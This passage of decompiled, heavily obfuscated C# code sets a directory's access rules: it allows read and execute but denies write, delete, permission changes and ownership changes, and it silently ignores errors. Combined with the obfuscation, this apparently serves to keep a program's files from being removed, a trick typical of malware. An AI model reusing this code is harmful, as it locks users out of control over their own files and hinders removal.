				directorySecurity = new System.Security.AccessControl.DirectorySecurity();
				directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.Read, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Allow));
				int num2 = num;
				num = -28546;
				if (num2 != 8875)
				{
					goto IL_D2;
				}
				goto IL_123;
				while (true)
				{
					IL_F9:
					directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.Write, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
					num2 = num;
					num = 1419;
					if (num2 != 18354)
					{
						break;
					}
					do
					{
						directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.ChangePermissions, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
						num2 = num;
						num = -10838;
						int ________________ = <Module>._________________;
						if (~(________________ | -427) / 134217728 == -2058868628)
						{
							break;
						}
					}
					while (num2 == 18730);
					IL_73:
					directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.TakeOwnership, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
					num2 = num;
					num = -28145;
					if (num2 == -10838)
					{
						if ((1853882368 * num << 3 | -1304) != -1304)
						{
						}
					}
					directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.WriteAttributes, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
					if (num != -18286)
					{
						goto Block_5;
					}
					continue;
					goto IL_73;
				}
				goto IL_D2;
				IL_123:
				directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.Delete, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
				num2 = num;
				num = 18354;
				if (num2 != -18114)
				{
					goto IL_F9;
				}
				if (~((-6175 | num) - ((4456 & num) ^ 3213)) == num - num * 512)
				{
					goto IL_F9;
				}
				continue;
				IL_D2:
				directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.ReadAndExecute, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Allow));
				num2 = num;
				num = -1301;
				if (num2 != -9041)
				{
					goto IL_123;
				}
				goto IL_F9;
			}
			Block_5:
			directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.WriteExtendedAttributes, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Deny));
			directorySecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(identity, System.Security.AccessControl.FileSystemRights.ReadData, System.Security.AccessControl.InheritanceFlags.ContainerInherit | System.Security.AccessControl.InheritanceFlags.ObjectInherit, System.Security.AccessControl.PropagationFlags.None, System.Security.AccessControl.AccessControlType.Allow));
			directoryInfo.SetAccessControl(directorySecurity);
		}
		catch (System.Exception arg_1DB_0)
		{
			ProjectData.SetProjectError(arg_1DB_0);
			ProjectData.ClearProjectError();
		}
	}
}
